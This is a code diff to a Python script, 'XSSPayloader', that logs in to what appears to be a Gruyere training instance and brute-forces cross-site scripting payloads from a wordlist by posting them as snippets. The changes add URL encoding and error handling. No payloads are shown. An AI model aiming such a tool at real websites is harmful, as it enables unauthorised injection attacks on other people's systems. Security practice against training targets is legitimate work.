@@ -1,4 +1,5 @@
 import requests
+import urllib.parse
 
 from tqdm import tqdm
 from bs4 import BeautifulSoup as bs
@@ -20,7 +21,7 @@ class XSSPayloader:
         self.init_login()
         self.init_payloads()
 
-    
+
     def init_session(self):
         self.s = requests.Session()
 
@@ -35,12 +36,12 @@ class XSSPayloader:
         self.snippet_url = self.gruyere_id_url + "/newsnippet2?snippet={}"
         self.snippet_delete_url = self.gruyere_id_url + "/deletesnippet?index=0"
 
-    
+
     def init_login(self):
         resp = self.s.get(self.signup_url.format(self.username, self.password))
         resp = self.s.get(self.login_url.format(self.username, self.password))
 
-    
+
     def init_payloads(self):
         with open(self.wordlist_path, "r") as f:
             self.payloads = f.readlines()
@@ -51,7 +52,7 @@ class XSSPayloader:
         self.successful_payloads = []
         for payload in tqdm(self.payloads):
             payload = payload.strip()
-            url_payload = payload.replace(" ", "+").strip()
+            url_payload = urllib.parse.quote_plus(payload.strip())
 
 
             if payload != "" and payload not in self.tested_payloads:
@@ -64,7 +65,7 @@ class XSSPayloader:
                     resp = self.s.get(self.snippet_delete_url)
 
                 self.tested_payloads.append(payload)
-            
+
 
     def report(self):
         if len(self.successful_payloads) > 0:
@@ -78,5 +79,9 @@ class XSSPayloader:
 
 if __name__ == "__main__":
     payloader = XSSPayloader()
-    payloader.bruteforce()
+    try:
+        payloader.bruteforce()
+    except Exception as e:
+        print(e)
+        input()
     payloader.report()
